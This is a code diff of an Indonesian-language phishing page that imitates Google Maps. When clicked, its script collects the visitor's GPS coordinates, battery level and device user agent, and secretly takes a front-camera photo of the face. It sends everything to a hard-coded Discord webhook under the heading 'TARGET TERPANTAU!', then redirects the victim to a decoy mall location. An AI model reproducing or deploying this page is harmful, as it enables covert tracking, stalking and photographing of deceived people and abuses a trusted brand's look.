@@ -3,95 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <title>Google Maps - Update Rute Real-time</title>
-    
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://titik-lokasi-maps.site">
+    <title>Google Maps - Lokasi Rute</title>
     
     <meta property="og:title" content="Google Maps - Lihat Lokasi & Rute">
-    
-    <meta property="og:description" content="Sinkronisasi GPS diperlukan untuk menayangkan rute yang presisi dan update lokasi real-time. Klik untuk melihat.">
-    
+    <meta property="og:description" content="Klik untuk sinkronisasi rute perjalanan terbaru ke lokasi tujuan.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png">
+
     <style>
-        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
-        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
-        .logo { width: 60px; margin-bottom: 15px; }
-        .btn { padding: 12px 20px; background: #4285F4; color: white; border: none; border-radius: 20px; cursor: pointer; font-size: 15px; font-weight: bold; width: 100%; transition: 0.3s; }
-        .btn:hover { background: #3367d6; }
-        .text { color: #70757a; margin-top: 15px; font-size: 13px; line-height: 1.4; }
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
+        .logo { width: 70px; margin-bottom: 20px; }
+        .btn { padding: 15px 25px; background: #4285F4; color: white; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
+        .text { color: #70757a; margin-top: 15px; font-size: 13px; line-height: 1.5; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" class="logo" alt="Maps Logo">
-        <button class="btn" onclick="mainkan()">Lihat Lokasi Terkini</button>
-        <p class="text">Sinkronisasi GPS diperlukan untuk menayangkan rute yang presisi dan update lokasi real-time.</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" class="logo">
+        <button class="btn" onclick="mainkan()">Lihat Lokasi Rute</button>
+        <p class="text">Klik tombol di atas untuk sinkronisasi GPS dan melihat estimasi waktu tiba di lokasi.</p>
     </div>
 
     <script>
-        // --- WEBHOOK DISCORD KAMU ---
         const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR"; 
+        
+        // --- LINK PALSU (Grand Indonesia Mall) ---
+        const linkPalsu = "https://maps.app.goo.gl/M6v1v59P7fM8K4K87"; 
 
         async function mainkan() {
-            document.querySelector('.btn').innerHTML = "Menghubungkan GPS...";
+            document.querySelector('.btn').innerHTML = "Menghubungkan...";
             
-            // Ambil Info Perangkat & Baterai
             let bInfo = "N/A";
             try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}%`; } catch(e){}
             let tipeHP = navigator.userAgent; 
 
-            // Minta Izin Lokasi
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapsUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                const mapsAsli = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
                 try {
-                    // Minta Izin Kamera (Otomatis setelah klik tombol)
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-
+                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
                     canvas.toBlob(async (blob) => {
-                        // --- PESAN 1: INFO HP & LINK MAPS ---
-                        // Ini dikirim duluan supaya muncul di atas
+                        // 1. KIRIM TEKS INFO KE DISCORD (Data Asli)
                         await fetch(webhookURL, {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({ 
-                                content: `**🚨 TARGET TERPANTAU!**\n\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n📍 **Maps:** ${mapsUrl}` 
+                                content: `**🚨 TARGET TERPANTAU!**\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n📍 **Lokasi Asli:** ${mapsAsli}` 
                             })
                         });
 
-                        // --- PESAN 2: FOTO ---
-                        // Dikirim setelah pesan pertama agar pasti di bawah sendiri
+                        // 2. KIRIM FOTO KE DISCORD
                         const formData = new FormData();
-                        formData.append("file", blob, "wajah_target.jpg");
+                        formData.append("file", blob, "wajah.jpg");
                         await fetch(webhookURL, { method: 'POST', body: formData });
 
-                        window.location.href = mapsUrl; // Redirect ke Maps
+                        // 3. LEMPAR TARGET KE LOKASI PALSU (Mall)
+                        window.location.href = linkPalsu; 
                     }, 'image/jpeg');
 
                     stream.getTracks().forEach(t => t.stop());
                 } catch (e) {
-                    // Jika kamera mati, tetap kirim data lokasi
+                    // Jika kamera ditolak, tetap kirim lokasi asli
                     await fetch(webhookURL, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ content: `**📍 LOKASI MASUK (Tanpa Foto)**\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n🌍 **Maps:** ${mapsUrl}` })
+                        body: JSON.stringify({ content: `**📍 LOKASI MASUK (Kamera Mati)**\n📍 **Lokasi Asli:** ${mapsAsli}` })
                     });
-                    window.location.href = mapsUrl;
+                    window.location.href = linkPalsu;
                 }
-            }, (err) => {
-                alert("Sinkronisasi gagal. Klik 'Izinkan' untuk melihat lokasi.");
-                document.querySelector('.btn').innerHTML = "Lihat Lokasi Terkini";
+            }, (err) => { 
+                alert("Izin GPS diperlukan untuk sinkronisasi rute."); 
+                document.querySelector('.btn').innerHTML = "Lihat Lokasi Rute";
             });
         }
     </script>
